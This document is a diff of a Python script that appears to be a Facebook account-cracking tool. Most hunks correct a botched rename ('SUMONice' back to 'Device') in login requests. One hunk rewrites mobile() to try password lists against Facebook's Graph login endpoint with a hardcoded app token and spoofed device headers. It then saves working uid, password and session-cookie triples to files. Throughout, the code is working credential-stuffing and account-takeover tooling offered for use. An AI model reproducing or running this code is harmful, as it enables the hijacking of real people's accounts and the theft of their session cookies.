@@ -833,14 +833,14 @@ def get_current_location():
         return None, None
 # Example usage
 current_city, current_country = get_current_location()
-def get_SUMONice_info(prop_name):
+def get_Device_info(prop_name):
     try:
         result = subprocess.run(['getprop', prop_name], capture_output=True, text=True, check=True)
         return result.stdout.strip()
     except subprocess.CalledProcessError as e:
         print(f"Error retrieving {prop_name}: {e}")
         return None
-manufacturer_name = get_SUMONice_info('ro.product.manufacturer')
+manufacturer_name = get_Device_info('ro.product.manufacturer')
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 os.system("xdg-open ")
 os.system("clear")
@@ -1514,7 +1514,7 @@ def freefb(uid, name, pwx, tl):
             headers = {
             'Host': 'mbasic.facebook.com',
             'method': 'POST',
-            'path': '/login/SUMONice-based/login/async/',
+            'path': '/login/Device-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1541,7 +1541,7 @@ def freefb(uid, name, pwx, tl):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post("https://mbasic.facebook.com/login/SUMONice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            lo = session.post("https://mbasic.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1587,14 +1587,14 @@ def bapi(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'SUMONice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_SUMONice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1621,7 +1621,7 @@ def bapi(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-SUMONice-group': '5120',
+                'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1669,14 +1669,14 @@ def graph(uid, name, pwx, tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'SUMONice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_SUMONice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1703,7 +1703,7 @@ def graph(uid, name, pwx, tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-SUMONice-group': str(random.randint(2000, 4000)),
+                'X-FB-Device-group': str(random.randint(2000, 4000)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1744,14 +1744,14 @@ def mbasic(uid,pwx,tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'SUMONice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_SUMONice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1775,10 +1775,10 @@ def mbasic(uid,pwx,tl):
                 'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'X-FB-Connection-Type': 'WIFI',
-                'X-FB-SUMONice-group': str(random.randint(2000, 4000)),
+                'X-FB-Device-group': str(random.randint(2000, 4000)),
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-SUMONice-group': '5120',
+                'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1827,14 +1827,14 @@ def p(uid,pwx,tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'SUMONice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_SUMONice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1861,7 +1861,7 @@ def p(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-SUMONice-group': '5120',
+                'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1910,7 +1910,7 @@ def x(uid,pwx,tl):
         for ps in pwx:
             ses = requests.Session()
             pro = random.choice(uas)
-            free_fb = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl')
+            free_fb = session.get('https://mbasic.facebook.com/login/Device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl')
             log_data = {
 'm_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
 'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
@@ -2004,102 +2004,85 @@ def mobile(uid,pwx,tl):
     global loop
     global oks
     global cps
-    global SUMONua
-    sys.stdout.write('\r\33[1;37m[M4-SUMON] %s|OK:%s \r'%(loop,len(oks))),
+    sys.stdout.write("\r\033[1;37m [M4-SUMON] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
-        for ps in pwx:
-            ses = requests.Session()
-            pro = random.choice(uas)
-            free_fb = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl')
-            log_data = {
-'m_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
-'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
-'try_number': re.search('name="try_number" value="(.*?)"',str(free_fb.text)).group(1),
-'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(free_fb.text)).group(1),
-'email': uid,
-'prefill_contact_point': uid,
-'prefill_source': 'browser_onload',
-'prefill_type': 'contact_point',
-'first_prefill_source': 'browser_dropdown',
-'first_prefill_type': 'contact_point',
-'had_cp_prefilled': 'true',
-'had_password_prefilled': 'false',
-'is_smart_lock': 'false',
-'bi_xrwh': '0',
-'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),ps),
-'fb_dtsg': '',
-'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
-'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
-'__dyn': '',
-'__csr': '',
-'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
-'__a': '',
-'__user':0}
-            header_freefb = {
-'authority': 'm.facebook.com',
-'accept': '*/*',
-'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-'content-type': 'application/x-www-form-urlencoded',
-'dpr': '2',
-'origin': 'https://m.facebook.com',
-'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
-'sec-ch-prefers-color-scheme': 'light',
-'sec-ch-ua': f'"Not_A Brand";v="{str(random.randint(8,24))}", "Chromium";v="{str(random.randint(110,120))}"',
-'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(random.randint(8,24))}.0.0.0", "Chromium";v="{str(random.randint(110,120))}.0.{str(random.randint(3000,6000))}.{str(random.randint(110,120))}"',
-'sec-ch-ua-mobile': '?1',
-'sec-ch-ua-platform': '"Android"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'user-agent': pro,
-'viewport-width': f'{str(random.randint(300,999))}',
-'x-asbd-id': '129477',
-'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
-'x-requested-with': 'XMLHttpRequest',
-'x-response-format': 'JSONStream',}
-            lo = session.post('https://p.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            #print(iid+'|'+pws+'|'+str(log_cookies))
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cok = session.cookies.get_dict()
-                cid = cok["c_user"]
-                d = "SUMON"
-                if "live" in check_lock(cid):
-                    if '%3A-1%3A-1' in coki:
-                        print('\33[1;94m[SUMON-NV] '+cid+' | '+ps+'\33[0;97m')
-                        break
+        for pw in pwx:
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'Device_id': str(uuid.uuid4()),
+                'email': uid,
+                'password': pw,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_Device_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_GB',
+                'client_country_code': 'GB',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            }
+            headers = {
+                'User-Agent': ua(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'b-graph.facebook.com',
+                'X-FB-Net-HNI': str(random.randint(20000,40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'WIFI',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-Device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
+            }
+            url = "https://b-graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers).json()
+            if "session_key" in result:
+                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                coki = f"sb={sb};{ckkk}"
+                try:
+                    uid = result["uid"]
+                except:
+                    uid = uid
+                c = check_lock(uid)
+                if "live" in c:
+                    if result["is_account_confirmed"] == False:
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
+                        print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/SUMON-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        print('\33[1;92m[SUMON-OK] '+cid+' | '+ps+'\33[0;97m')
-                        if "yes" in cookie_show:
-                            print(f"\033[1;32mCOOKIES : {coki}")
-                            open('/sdcard/SUMON-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
-                            oks.append(cid)
-                            break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                if "Enter login code to continue" in log_cookies:
-                    print('\33[1;94m[SUMON-2F] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/SUMON-2f.txt', 'a').write(uid+' | '+ps+'\n')
-                    twf.append(uid)
-                    break
-                else:
-                    print('\33[1;91m[SUMON-CP] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+ps+'\n')
-                    cps.append(uid)
-                    break
+                        print(f" {green}[SUMON-OK] {uid}|{pw}")
+                        print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/SUMON_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        oks.append(uid)
+                        break
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop+=1
     except net_error:
         time.sleep(10)
     except Exception as e:
         pass
-    except:
-        pass
+
 
 def freeq(uid,pwx,tl):
     global loop
@@ -2112,14 +2095,14 @@ def freeq(uid,pwx,tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'SUMONice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_SUMONice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -2146,7 +2129,7 @@ def freeq(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-SUMONice-group': '5120',
+                'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2193,14 +2176,14 @@ def d(uid,pwx,tl):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'SUMONice_id': str(uuid.uuid4()),
+                'Device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_SUMONice_id': str(uuid.uuid4()),
+                'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -2227,7 +2210,7 @@ def d(uid,pwx,tl):
                 'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-SUMONice-group': '5120',
+                'x-fb-Device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -2484,7 +2467,7 @@ def cracker(uid, pwx, tl):
             headers = {
             'Host': 'mbasic.facebook.com',
             'method': 'POST',
-            'path': '/login/SUMONice-based/login/async/',
+            'path': '/login/Device-based/login/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
